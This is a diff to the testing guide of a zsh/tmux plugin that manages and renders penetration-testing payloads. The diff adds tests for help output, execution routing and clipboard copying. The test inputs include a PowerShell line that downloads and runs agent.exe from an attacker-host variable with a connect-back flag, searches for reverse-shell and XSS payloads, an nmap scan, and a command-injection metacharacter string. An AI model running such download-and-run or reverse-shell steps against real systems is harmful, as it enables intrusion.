@@ -1,10 +1,6 @@
 # Testing
 
-All commands below assume the repo is at:
-
-```text
-/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
-```
+All commands below are intended to be run from the project root.
 
 ## Syntax Check
 
@@ -20,7 +16,6 @@ zsh -n lib/*.zsh
 This does not require tmux:
 
 ```zsh
-cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
 zsh -fc 'source ./ii.plugin.zsh && type ii && ii p --help >/dev/null && print $II_PAYLOAD_DIR'
 ```
 
@@ -28,8 +23,110 @@ Expected result:
 
 ```text
 ii is a shell function
-/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali/payloads
+<project-root>/payloads
 ```
+
+## Help Audit
+
+Check every feature-registered help topic and verify that short help flags do
+not enter normal command execution:
+
+```zsh
+./script/help
+zsh -fc 'source ./ii.plugin.zsh; for command in "get -h" "load -h" "sync -h" "interactive -h" "ls -h" "payload -h" "unset -h" "version -h" "p --input -h" "p --www -h" "p --www --file -h" "p --www ln -h" "p --www ls -h" "p --www search -h"; do ii ${(z)command} >/dev/null || exit; done'
+zsh -fc 'source ./ii.plugin.zsh; ii help pic | grep -Fq "ii pic [-o [PATH]]"'
+zsh -fc 'source ./ii.plugin.zsh; ii help pe | grep -Fq "ii pe [KEYWORD ...]"'
+zsh -fc 'source ./ii.plugin.zsh; ii help pce | grep -Fq "ii pce [KEYWORD ...]"'
+zsh -fc 'source ./ii.plugin.zsh; ii help pice | grep -Fq "ii pice"'
+zsh -fc 'source ./ii.plugin.zsh; ii help tmux | grep -Fq "ii tmux enable"'
+zsh -fc 'source ./ii.plugin.zsh; ii help pc | grep -Fq "ii pc KEYWORD [KEYWORD ...]"'
+zsh -fc 'source ./ii.plugin.zsh; ii help sr | grep -Fq "ii sr VALUE"'
+zsh -fc 'source ./ii.plugin.zsh; ii help voc | grep -Fq "ii voc [PATH]"'
+```
+
+Each command must return zero without requiring tmux, fzf, a source path, or a
+configured web root. `script/help` also fails when any canonical topic is
+missing its `usage`, `Aliases`, or `Help` section.
+
+Registry conflicts must be rejected without partially adding the failed topic:
+
+```zsh
+zsh -fc 'source ./lib/help_registry.zsh; a() { :; }; b() { :; }; ii_help_register one a shared; ii_help_register two b unique shared && exit 1; [[ "$II_HELP_REGISTRY_ERROR" == 1 && -z "${II_HELP_HANDLERS[two]-}" && -z "${II_HELP_ROUTES[unique]-}" ]]'
+```
+
+## Interactive Payload Input
+
+Run `ii pic` in a terminal and verify the status line remains below the edit
+buffer:
+
+```text
+Enter Finish    Ctrl-J New line    :q Cancel
+```
+
+Type `first`, press Ctrl-J, type `second`, and press Enter. The rendered and
+copied body must contain two lines. Enter submits; Ctrl-J inserts a newline.
+Entering `:q` or `:q!` as the complete buffer cancels.
+
+The non-interactive protocol remains available for pipelines:
+
+```zsh
+printf 'first\nsecond\n:w\n' | ii pic
+```
+
+## Payload Execute Routing
+
+In the payload selector, verify that normal-mode `e` confirms, executes, and
+closes, while Enter only renders. With `ii p --execute` or `ii pe`, Enter
+confirms and executes instead. `ii p --copy --execute` and `ii pce` must copy
+after confirmation and before execution.
+Execution occurs in the current shell, so this payload must leave both changes
+visible after the selector closes:
+
+```text
+typeset -g II_EXEC_TEST=ok; cd /tmp
+```
+
+Multiple keywords initialize one fzf query:
+
+```zsh
+ii p power shell reverse
+ii p --execute power shell reverse
+ii pe power shell reverse
+ii pce power shell reverse
+```
+
+For input execution, verify that `ii pice` accepts no arguments, renders input,
+requires `[y/N]`, copies only after `y`, and executes in the current shell.
+Clipboard failure must be reported without preventing confirmed execution.
+
+## Tmux Popup Input Execution
+
+After `ii tmux enable`, `Prefix + :` followed by the exact `ii pice` command
+must open an isolated popup. The popup path is:
+
+```text
+popup input -> tmux-only render -> preview and [y/N] -> copy -> originating pane -> Enter
+```
+
+Paste input into the popup and press Ctrl-D to render. Verify that the
+originating pane receives no input before `y`, that unresolved lowercase
+variables remain unchanged and produce an execute-anyway warning, and that
+uppercase variables do not produce that warning. Non-ii command-prompt input
+must retain normal tmux behavior. `ii tmux disable` must restore the prior `:`
+binding after no enabled session remains.
+
+## Payload Best-match Copy
+
+`ii pc` and `ii p --copy` must not open the selector. Both join all keywords,
+use non-interactive fzf ranking, render the first match, and copy it:
+
+```zsh
+ii pc power shell reverse
+ii p --copy power shell reverse
+```
+
+No match, missing keywords, render failure, or clipboard failure must return
+nonzero.
 
 ## Payload Category Filter Check
 
@@ -37,7 +134,6 @@ This verifies that `script` is a supported payload category and dotfiles used to
 keep empty directories are not shown as payload entries.
 
 ```zsh
-cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
 zsh -fc 'source ./ii.plugin.zsh; ii_payload_list | grep -q "^script/.gitkeep$" && print bad || print ok'
 zsh -fc 'source ./ii.plugin.zsh; print script/custom | ii_payload_filter script'
 zsh -fc 'source ./ii.plugin.zsh; rendered="$(ii_payload_render payloads/script/tool/nmap/nmap)"; print -r -- "$rendered" | grep -Fq "sudo nmap -p- -Pn -T4 \$rhost" && print ok'
@@ -55,13 +151,14 @@ ok
 
 ## Lowercase Payload Render Test
 
-This verifies that normal payload rendering replaces lowercase `$name`
-placeholders from tmux while leaving uppercase shell variables unchanged.
+This verifies that normal payload rendering replaces lowercase `%name%`,
+`$name`, `${name}`, and `${name:t}` placeholders from tmux while leaving
+uppercase and legacy `II_NAME` forms unchanged.
 
 ```zsh
 tmux kill-session -t codex-ii-lower-payload 2>/dev/null || true
 tmux new-session -d -s codex-ii-lower-payload -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-lower-payload "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-lower-payload "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-lower-payload "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-lower-payload "ii s rhost 10.10.10.20" Enter
 tmux send-keys -t codex-ii-lower-payload "ii_payload_render payloads/script/tool/nmap/nmap" Enter
@@ -90,7 +187,7 @@ Run from outside or inside tmux. It creates an isolated session named
 ```zsh
 tmux kill-session -t codex-ii-test 2>/dev/null || true
 tmux new-session -d -s codex-ii-test -x 120 -y 40 zsh
-tmux send-keys -t codex-ii-test "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-test "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-test "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-test "ii s LHOST 127.0.0.1" Enter
 tmux send-keys -t codex-ii-test "ii s LPORT 4444" Enter
@@ -126,11 +223,11 @@ pane has not run `ii l`.
 tmux kill-session -t codex-ii-crosspane 2>/dev/null || true
 tmux new-session -d -s codex-ii-crosspane -x 120 -y 40 zsh
 tmux split-window -t codex-ii-crosspane zsh
-tmux send-keys -t codex-ii-crosspane:0.0 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-crosspane:0.0 "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-crosspane:0.0 "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-crosspane:0.0 "ii s LHOST 10.10.10.10" Enter
 tmux send-keys -t codex-ii-crosspane:0.0 "ii s LPORT 9001" Enter
-tmux send-keys -t codex-ii-crosspane:0.1 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-crosspane:0.1 "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-crosspane:0.1 "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-crosspane:0.1 "echo pane2-shell-before:\$LHOST" Enter
 tmux send-keys -t codex-ii-crosspane:0.1 "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
@@ -156,7 +253,7 @@ reported as unresolved instead of blocking render/output.
 ```zsh
 tmux kill-session -t codex-ii-payload-fallback 2>/dev/null || true
 tmux new-session -d -s codex-ii-payload-fallback -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-payload-fallback "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-payload-fallback "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-payload-fallback "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-payload-fallback "printf 'y\n' | ii unset -a" Enter
 tmux send-keys -t codex-ii-payload-fallback "ii s LHOST 127.0.0.1" Enter
@@ -176,13 +273,13 @@ lport unresolved: kept as ${lport}
 
 ## Special Character Copy Test
 
-This verifies that rendered payloads are piped into tmux buffer through stdin
-and are not broken by common shell metacharacters.
+This verifies that `y` copies the rendered payload through stdin, closes the
+selector, and does not break common shell metacharacters.
 
 ```zsh
 tmux kill-session -t codex-ii-special 2>/dev/null || true
 tmux new-session -d -s codex-ii-special -x 120 -y 40 zsh
-tmux send-keys -t codex-ii-special "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-special "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-special "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-special "ii s DOMAIN \"a b/c;whoami & test\"" Enter
 tmux send-keys -t codex-ii-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_PAYLOAD_KEY=y II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
@@ -200,27 +297,30 @@ Expected buffer:
 
 ## Input Render Test
 
-This verifies that `ii p --input` renders lowercase variables, leaves uppercase
-and PowerShell scope variables unchanged, stops at `:w`, and copies only the
-rendered body when `--copy` is used.
+This verifies the non-interactive `ii p --input` protocol: lowercase variables
+render, uppercase and PowerShell scope variables remain unchanged, `:w` stops
+input, and `--copy` copies only the rendered body.
 
 ```zsh
 tmux kill-session -t codex-ii-input 2>/dev/null || true
+input_file="$(mktemp)"
+printf '%s\n' \
+  '$KALI = "$lhost"' \
+  '$FILE = "${file:t}"' \
+  'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' \
+  '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' \
+  ':w' > "$input_file"
 tmux new-session -d -s codex-ii-input -x 160 -y 60 zsh
-tmux send-keys -t codex-ii-input "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-input "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-input "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-input "ii s lhost 10.10.14.7" Enter
 tmux send-keys -t codex-ii-input "file=/tmp/drop/agent.exe" Enter
-tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p --input --copy" Enter
-tmux send-keys -t codex-ii-input '$KALI = "$lhost"' Enter
-tmux send-keys -t codex-ii-input '$FILE = "${file:t}"' Enter
-tmux send-keys -t codex-ii-input 'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' Enter
-tmux send-keys -t codex-ii-input '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' Enter
-tmux send-keys -t codex-ii-input ':w' Enter
+tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p --input --copy < ${(q)input_file}" Enter
 sleep 2
 tmux capture-pane -t codex-ii-input -p -S -120
 tmux show-buffer
 tmux kill-session -t codex-ii-input
+rm -f "$input_file"
 ```
 
 Expected buffer:
@@ -275,7 +375,7 @@ G101MjtjO1lTQmlMMk03ZDJodllXMXBJQ1lnZEdWemRBPT0H
 ```zsh
 tmux kill-session -t codex-ii-vars 2>/dev/null || true
 tmux new-session -d -s codex-ii-vars -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-vars "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-vars "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-vars "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-vars "ii s GOOD_NAME ok" Enter
 tmux send-keys -t codex-ii-vars "ii ls good" Enter
@@ -300,7 +400,7 @@ ii: invalid variable name: BAD-NAME
 ```zsh
 tmux kill-session -t codex-ii-unset-all 2>/dev/null || true
 tmux new-session -d -s codex-ii-unset-all -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-unset-all "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-unset-all "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-unset-all "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-unset-all "ii s LHOST 192.0.2.10" Enter
 tmux send-keys -t codex-ii-unset-all "ii s USER1=alice" Enter
@@ -329,7 +429,7 @@ unset 2 variable(s)
 ```zsh
 tmux kill-session -t codex-ii-views 2>/dev/null || true
 tmux new-session -d -s codex-ii-views -x 120 -y 35 zsh
-tmux send-keys -t codex-ii-views "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-views "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-views "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-views "ii s LHOST 192.0.2.10" Enter
 tmux send-keys -t codex-ii-views "ii s RHOST 198.51.100.20" Enter
@@ -370,7 +470,7 @@ input, and that unset default names are not loaded into the shell.
 ```zsh
 tmux kill-session -t codex-ii-case 2>/dev/null || true
 tmux new-session -d -s codex-ii-case -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-case "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-case "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-case "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-case "ii s user2=bob" Enter
 tmux send-keys -t codex-ii-case "unset USER2 user2 PASS2 pass2" Enter
@@ -391,16 +491,16 @@ user2:/bob pass2:unset/unset
 
 ## Set Shortcut And Edit Test
 
-This verifies that `ii s r`, `ii s:r`, and edit flow all target `RHOST`.
+This verifies that CLI shortcut names and the interactive edit flow all target
+`RHOST`.
 
 ```zsh
 tmux kill-session -t codex-ii-keys 2>/dev/null || true
 tmux new-session -d -s codex-ii-keys -x 120 -y 40 zsh
-tmux send-keys -t codex-ii-keys "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-keys "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-keys "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-keys "ii s r 10.0.0.5" Enter
 tmux send-keys -t codex-ii-keys "ii s:r 10.0.0.6" Enter
-tmux send-keys -t codex-ii-keys "II_SET_VALUE_FILTER=10.0.0.7 ii s r" Enter
 tmux send-keys -t codex-ii-keys "II_EDIT_VALUE_FILTER=10.0.0.8 ii_cmd_interactive_edit_variable RHOST" Enter
 tmux send-keys -t codex-ii-keys "ii ls host" Enter
 sleep 3
@@ -414,35 +514,21 @@ Expected signs:
 ```text
 rhost=10.0.0.5
 rhost=10.0.0.6
-rhost=10.0.0.7
 rhost=10.0.0.8
 ```
 
-## Set Filter Match Test
+## CLI-only Set Validation
 
-This verifies `ii s FILTER` handling for one match, no matches, and multiple
-matches.
+This verifies that `ii s` no longer enters an interactive selector and that a
+name without a value is rejected.
 
 ```zsh
-tmux kill-session -t codex-ii-set-match 2>/dev/null || true
-tmux new-session -d -s codex-ii-set-match -x 120 -y 35 zsh
-tmux send-keys -t codex-ii-set-match "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
-tmux send-keys -t codex-ii-set-match "source ./ii.plugin.zsh" Enter
-tmux send-keys -t codex-ii-set-match "II_SET_VALUE_FILTER=10.0.0.9 ii s r" Enter
-tmux send-keys -t codex-ii-set-match "ii s nope" Enter
-tmux send-keys -t codex-ii-set-match "FZF_DEFAULT_OPTS='--filter=LPORT' II_SET_VALUE_FILTER=443 ii s port" Enter
-sleep 2
-tmux capture-pane -t codex-ii-set-match -p -S -140
-tmux kill-session -t codex-ii-set-match
+zsh -fc 'source ./ii.plugin.zsh; ii s >/dev/null; test $? -eq 2'
+zsh -fc 'source ./ii.plugin.zsh; ii s rhost >/dev/null 2>&1; test $? -eq 2'
 ```
 
-Expected signs:
-
-```text
-rhost=10.0.0.9
-no matched
-lport=443
-```
+Both commands must return zero because the rejected `ii s` invocation returned
+status 2 as expected. Neither check requires tmux or fzf.
 
 ## Get Filter Match Test
 
@@ -452,7 +538,7 @@ It should copy and print selected values; abort should not copy anything.
 ```zsh
 tmux kill-session -t codex-ii-get 2>/dev/null || true
 tmux new-session -d -s codex-ii-get -x 120 -y 35 zsh
-tmux send-keys -t codex-ii-get "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-get "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-get "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-get "ii s LHOST 10.10.10.10" Enter
 tmux send-keys -t codex-ii-get "ii s RHOST 10.10.10.20" Enter
@@ -482,7 +568,7 @@ settings.
 ```zsh
 tmux kill-session -t codex-ii-clip 2>/dev/null || true
 tmux new-session -d -s codex-ii-clip -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-clip "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-clip "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-clip "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-clip "ii clip backend xclip-both" Enter
 tmux send-keys -t codex-ii-clip "unset II_CLIP_BACKEND II_CLIP_CMD; ii clip backend" Enter
@@ -508,7 +594,7 @@ with case-insensitive search. It should not load variables into the shell.
 ```zsh
 tmux kill-session -t codex-ii-i 2>/dev/null || true
 tmux new-session -d -s codex-ii-i -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-i "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-i "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-i "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-i "ii s LHOST 172.16.1.10" Enter
 tmux send-keys -t codex-ii-i "unset LHOST lhost ii_lhost" Enter
@@ -535,7 +621,7 @@ the `ii i` selector source.
 ```zsh
 tmux kill-session -t codex-ii-i-order 2>/dev/null || true
 tmux new-session -d -s codex-ii-i-order -x 120 -y 30 zsh
-tmux send-keys -t codex-ii-i-order "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-i-order "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-i-order "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-i-order "ii s rhost 10.0.0.8" Enter
 tmux send-keys -t codex-ii-i-order "ii s usert=alice" Enter
@@ -553,6 +639,23 @@ usert
 domain
 ```
 
+The empty default candidates must be exactly `domain`, `lhost`, `rhost`,
+`lport`, `rport`, `user1` through `user5`, `pass1` through `pass5`, `cuser`,
+`cpass`, `tuser`, `tpass`, and `directs`, minus any names already populated.
+`file`, `usert`, `passt`, and `mm` must not appear as empty defaults; they
+remain valid explicitly created variable names.
+
+## Set All Defaults From Shell Test
+
+Inside tmux, define a mixture of lowercase, uppercase, empty, removed-default,
+and unrelated shell variables, then run `ii s --from-shell -a`. Verify that ii
+prefers non-empty lowercase values, falls back to uppercase, prints every saved
+default, skips empty values without warnings, and does not import removed or
+arbitrary names.
+
+The default-name source for this test is `ii_var_default_names`; it must include
+`directs` and exclude `file`, `usert`, `passt`, and `mm`.
+
 ## Interactive Add Variable Test
 
 This verifies that `ii i` can create a new variable through the final add
@@ -561,7 +664,7 @@ option, and that empty values are stored but skipped by `ii l`.
 ```zsh
 tmux kill-session -t codex-ii-add 2>/dev/null || true
 tmux new-session -d -s codex-ii-add -x 120 -y 35 zsh
-tmux send-keys -t codex-ii-add "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-add "cd \"${PWD}\"" Enter
 tmux send-keys -t codex-ii-add "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=token II_ADD_VALUE_FILTER=abc123 ii i" Enter
 tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=emptytest II_ADD_VALUE_FILTER= ii i" Enter
@@ -582,39 +685,11 @@ loaded 1 variable(s)
 token:abc123/abc123 empty:unset/unset
 ```
 
-## Interactive Set Test
-
-This verifies `ii s` with no arguments. `II_SET_VAR_FILTER` and
-`II_SET_VALUE_FILTER` make the two fzf steps deterministic for testing.
-
-```zsh
-tmux kill-session -t codex-ii-s-filter 2>/dev/null || true
-tmux new-session -d -s codex-ii-s-filter -x 120 -y 35 zsh
-tmux send-keys -t codex-ii-s-filter "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
-tmux send-keys -t codex-ii-s-filter "source ./ii.plugin.zsh" Enter
-tmux send-keys -t codex-ii-s-filter "II_SET_VAR_FILTER=LHOST II_SET_VALUE_FILTER=192.0.2.10 ii s" Enter
-tmux send-keys -t codex-ii-s-filter "ii ls host" Enter
-tmux send-keys -t codex-ii-s-filter "echo loaded:\$LHOST/\$lhost" Enter
-tmux send-keys -t codex-ii-s-filter "echo hidden:\$ii_lhost" Enter
-sleep 2
-tmux capture-pane -t codex-ii-s-filter -p -S -120
-tmux kill-session -t codex-ii-s-filter
-```
-
-Expected signs:
-
-```text
-lhost=192.0.2.10
-loaded:/192.0.2.10
-hidden:
-```
-
 ## Manual Interactive Test
 
 Inside an existing tmux session:
 
 ```zsh
-cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
 source ./ii.plugin.zsh
 
 ii s LHOST 192.168.45.192
